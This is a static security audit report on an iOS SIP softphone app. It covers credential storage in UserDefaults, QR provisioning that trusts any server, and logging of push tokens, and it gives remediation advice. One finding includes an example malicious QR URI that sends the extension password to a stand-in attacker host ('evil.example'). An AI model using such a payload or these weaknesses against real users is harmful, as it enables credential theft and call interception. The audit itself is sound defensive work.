# Mobile Security Audit — Aria Softphone (iOS)

- **Date:** 2026-07-27
- **Target:** `/Users/josh/dev/5060/aria-ios` (`AriaSoftphone/`, ~5,586 LOC Swift)
- **App type:** SIP softphone — stores SIP credentials, scans QR provisioning codes, receives VoIP push
- **Scope:** Credential storage, Info.plist/entitlements, QR provisioning, URL/universal-link handling, TLS, hardcoded secrets
- **Method:** Static source review. No dynamic testing. The nested `AriaSoftphone/Aria Softphone/**` tree is the default Xcode template (excluded from the build in `project.yml`) and was not audited.

---

## Executive Summary

The app has a clean baseline in several respects: **App Transport Security is not weakened** (no `NSAllowsArbitraryLoads`/exceptions), **no custom URL scheme is registered** (`aria://` is only consumed via the camera, so there is no scheme-hijack or unvalidated-`openURL` surface), and **there is no TLS validation bypass** in Swift (no `URLSession` delegate accepting all certs, no `SecTrust` override). API calls use `URLSession.shared` with default certificate validation.

The material problems are in **credential storage** and **provisioning trust**:

- The **SIP account password** and the **JWT session token** are persisted in **`UserDefaults`** (unencrypted plist in the app container) rather than the Keychain. There is **no Keychain usage anywhere** in the codebase.
- The **QR provisioning payload is not validated against any trusted server/domain**, so a hostile QR code can point the app at an attacker-controlled API endpoint and cause the app to POST the user's extension password to it.
- **Sensitive data (full VoIP push payload and push token) is written to the log** via `print`.

## HIGH Findings

### H1 — SIP account password persisted in UserDefaults (cleartext)

- **Severity:** HIGH
- **File:** `AriaSoftphone/App/ContentView.swift:104`

```swift
UserDefaults.standard.set(credentials.password, forKey: "sipPassword_temp")
```

`SetupView.handleQRScanned` writes the raw SIP password into `UserDefaults`. `UserDefaults` is stored as an unencrypted `.plist` in the app's `Library/Preferences` directory. It is included in unencrypted iTunes/Finder backups and iCloud backups, and is trivially readable on a jailbroken device or via forensic extraction. This is the credential that authenticates the extension to the PBX / SIP registrar.

**Exploit / failure scenario:** An attacker with physical access, a jailbroken device, or an unencrypted device backup extracts `sipPassword_temp` from the app container and gains full control of the victim's phone extension (place/receive calls, toll fraud, impersonation).

**Fix:** Store the SIP password in the iOS Keychain with `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` (device-only, not synced, not backed up). Remove the `UserDefaults` write entirely. Note the key name `sipPassword_temp` and the fact that `SettingsView`'s QR handler keeps the password only in `@State` (never persisted) reveal that credential handling is inconsistent between the two provisioning entry points — unify on Keychain.

### H2 — JWT session token (and session identifiers) persisted in UserDefaults

- **Severity:** HIGH
- **File:** `AriaSoftphone/Views/Settings/SettingsView.swift:23-27`

```swift
@AppStorage("jwt") private var jwt = ""
@AppStorage("extensionId") private var extensionId = ""
@AppStorage("tenantId") private var tenantId = ""
@AppStorage("pbxDeviceId") private var pbxDeviceId = ""
@AppStorage("gatewayUrl") private var gatewayUrl = ""
```

`@AppStorage` is backed by `UserDefaults`. The `jwt` is a bearer token returned by `POST /api/v1/auth/extension-login` and is used as `Authorization: Bearer <jwt>` for device registration/unregistration, and is also used as the default gateway token (`SettingsView.swift:373`). Storing a bearer credential in `UserDefaults` has the same exposure as H1 (unencrypted container, backups, forensic/jailbreak recovery).

**Exploit / failure scenario:** Recovered JWT lets an attacker call the PBX REST API as the victim's extension/tenant (register rogue push devices, unregister the victim, and — depending on server scope — other authenticated actions) until the token expires or is revoked.

**Fix:** Move `jwt` (and any gateway token) to the Keychain (`WhenUnlockedThisDeviceOnly`). Non-secret identifiers (`extensionId`, `tenantId`, `pbxDeviceId`, `gatewayUrl`) may remain in `UserDefaults`. Ensure the token is cleared from the Keychain on sign-out.

### H3 — Malicious QR provisioning code can redirect auth to a hostile server and exfiltrate the extension password

- **Severity:** HIGH
- **Files:** `AriaSoftphone/Views/Settings/QRScannerView.swift:21-64`, `AriaSoftphone/Views/Settings/SettingsView.swift:338-356`

```swift
// QRScannerView.swift
guard let server = params["server"], let user = params["user"], let passB64 = params["pass"] else { return nil }
...
let apiUrl = params["api"] ?? ""
let tenantDomain = params["tenant"] ?? ""
```

```swift
// SettingsView.performLogin()
let client = PbxApiClient(baseUrl: apiUrl)                 // apiUrl comes straight from the QR
let loginResult = try await client.extensionLogin(
    extensionNumber: sipUsername,
    password: sipPassword,                                  // password POSTed to attacker host
    tenantDomain: sipDomain)
```

`parseProvisioningURI` validates only that the URI scheme is `aria` and host is `provision`. The `api`, `server`, and `tenant` values are accepted with **no allowlist, no domain pinning, and no user confirmation of the destination**. After a scan the app **auto-triggers `performLogin()`** (`SettingsView.swift:333`), which POSTs the extension number and password to whatever `apiUrl` the QR specified.

**Exploit / failure scenario:** An attacker prints/emails/embeds a QR such as `aria://provision?user=1001&pass=<b64>&api=https://evil.example/collect&server=evil.example`. A user who scans it (social engineering — "scan to set up your new phone") causes the app to send `extension_number` + `password` to `evil.example`, and to route SIP registration to the attacker's server. Full credential capture and call interception.

**Fix:**
- Constrain `apiUrl`/`server` to a trusted domain (allowlist or suffix pin, e.g. `*.ariaroute.com` / the tenant's known domain), and reject others.
- Require `https://` for `apiUrl` (reject `http://`).
- Do not auto-login; show a confirmation screen displaying the server/API host the credentials will be sent to, and require an explicit tap.
- Consider signing the provisioning payload server-side and verifying the signature before use.

## MEDIUM Findings

### M1 — Full VoIP push payload and push token written to the log

- **Severity:** MEDIUM
- **File:** `AriaSoftphone/Push/PushHandler.swift:32`, `AriaSoftphone/Push/PushHandler.swift:61`

```swift
print("VoIP push token: \(token)")                       // line 32
print("Received VoIP push: \(payload.dictionaryPayload)")// line 61 — logs call_token, caller_uri, gateway_url
```

`print` output goes to the unified logging system / device console and is retrievable via Console.app and `sysdiagnose` bundles. The push payload includes `call_token` (used at `SipEngineManager.handlePushNotification` to fetch the full call offer from the gateway — effectively a short-lived call bearer) and caller identity metadata; the VoIP push token identifies the device to APNs.

**Exploit / failure scenario:** Anyone able to read device logs (co-located attacker with a Mac, a support/sysdiagnose bundle shared for troubleshooting, or another app harvesting logs on older iOS) obtains call tokens and caller metadata (privacy leak) and the push token.

**Fix:** Remove these logs or gate them behind `#if DEBUG`. Never log tokens, payloads, or caller identifiers in release builds. If logging is needed, use `os.Logger` with `privacy: .private` and log only non-sensitive fields.

### M2 — SIP transport defaults to cleartext UDP

- **Severity:** MEDIUM
- **File:** `AriaSoftphone/Views/Settings/QRScannerView.swift:48`

```swift
let transport = params["transport"] ?? "udp"
```

When the QR omits `transport`, SIP signaling defaults to UDP. SIP over UDP transmits registration and call-control (INVITE, To/From, caller identity, routing) in cleartext. iOS App Transport Security does **not** cover the Rust core's raw SIP/media sockets (ATS applies only to `URLSession`/CFNetwork), so the platform provides no protection here.

**Exploit / failure scenario:** A network attacker (open Wi-Fi, malicious hotspot) observes SIP signaling metadata and can attempt registration hijacking/manipulation of unauthenticated messages. Digest auth avoids sending the cleartext password, but signaling confidentiality/integrity is lost.

**Fix:** Default `transport` to `tls` and prefer SIP-over-TLS end to end; treat `udp`/`tcp` provisioning as an explicit opt-out. Ensure the Rust core validates the server certificate for TLS transport.

### M3 — No Keychain anywhere; outgoing-call credential path is stubbed/broken

- **Severity:** MEDIUM
- **File:** `AriaSoftphone/CallKit/CallManager.swift:199-207`

```swift
let credentials = SipCredentials(
    username: UserDefaults.standard.string(forKey: "sipUsername") ?? "",
    password: "", // Retrieved from Keychain in production
    ...
```

The outgoing-call path builds `SipCredentials` from `UserDefaults` and passes an **empty password**, with a comment acknowledging a Keychain retrieval that was never implemented. Combined with H1 (password persisted under `sipPassword_temp`) and `SettingsView` keeping the password only in `@State`, credential handling is inconsistent and partially non-functional across the app. This is both a security gap (no encrypted store exists) and a correctness/reliability gap.

**Exploit / failure scenario:** Not directly exploitable, but the absence of any Keychain store is the root cause of H1/H2 — secrets end up in `UserDefaults` because there is no secure store wired up. The stubbed path indicates outgoing auth relies on state cached inside the Rust engine, which may break after app relaunch.

**Fix:** Implement a single Keychain-backed credential store (`WhenUnlockedThisDeviceOnly`) and have all call paths (register, outgoing, incoming) read the SIP password from it. Remove the empty-password placeholder.

## LOW Findings

### L1 — QR provisioning code carries the SIP password base64-encoded (obfuscation, not encryption)

- **Severity:** LOW
- **File:** `AriaSoftphone/Views/Settings/QRScannerView.swift:41-44`

```swift
guard let passData = Data(base64Encoded: passB64),
      let password = String(data: passData, encoding: .utf8) else { return nil }
```

The `pass` parameter is base64, which is trivially reversible. Anyone who photographs, screenshots, or intercepts the provisioning QR (e.g. a QR emailed in the clear, left on a desk, or shown in a shared screen) recovers the SIP password. This is partly inherent to QR provisioning but should be treated as a plaintext-equivalent secret.

**Fix:** Prefer short-lived, single-use provisioning tokens exchanged for credentials over TLS, rather than embedding the long-lived password in the QR. Expire/rotate provisioning QRs server-side.

---

### L2 — `gateway_url` from the push payload is trusted without validation

- **Severity:** LOW
- **File:** `AriaSoftphone/Push/PushHandler.swift:67`

```swift
guard let ... gatewayUrl = data["gateway_url"] as? String else { ... }
```

The gateway URL used to fetch the call offer is taken from the push payload and passed to the engine unvalidated. Risk is limited because APNs delivery is authenticated by Apple and the VoIP topic is app-specific, but a compromised push path could redirect offer fetching.

**Fix:** Validate `gateway_url` against the configured/known gateway domain before use, or ignore it and use the stored `gatewayUrl` from provisioning.

## Positive Observations (no action required)

- **No ATS weakening:** `Info.plist` and `project.yml` contain no `NSAppTransportSecurity` / `NSAllowsArbitraryLoads` / `NSExceptionAllowsInsecureHTTPLoads` keys. Default ATS (TLS 1.2+, no cleartext) applies to `URLSession` traffic.
- **No custom URL scheme / universal links:** No `CFBundleURLTypes` and no `com.apple.developer.associated-domains` entitlement. `aria://provision` is only parsed from camera-scanned QR strings, so there is no `openURL`/`onOpenURL`/`userActivity` handler to abuse and no scheme-hijack surface.
- **No TLS bypass:** No `URLSession` delegate implementing `urlSession(_:didReceive:)`, no `serverTrust`/`SecTrust` overrides. `PbxApiClient` uses `URLSession.shared` with default validation.
- **No hardcoded secrets:** No API keys/passwords in source or plists. The only embedded endpoint is a non-secret default gateway host `https://push.ariaroute.com` (`SettingsView.swift:372`, over HTTPS).
- **Usage-description strings present** for camera, microphone, and contacts; background modes are limited to `voip` and `audio`, appropriate for a softphone.

---

## Recommended Remediation Priority

1. **H1 / H2 / M3** — Introduce a Keychain credential store (`WhenUnlockedThisDeviceOnly`); migrate SIP password and JWT off `UserDefaults`; remove `sipPassword_temp` and the empty-password stub. (Single change resolves the storage findings.)
2. **H3** — Domain-pin/allowlist and `https`-require the provisioning `api`/`server`; replace auto-login with an explicit confirmation of the destination host.
3. **M1** — Strip/`#if DEBUG`-gate all `print` of tokens and push payloads.
4. **M2 / L1 / L2** — Default to TLS transport; move to short-lived provisioning tokens; validate push `gateway_url`.
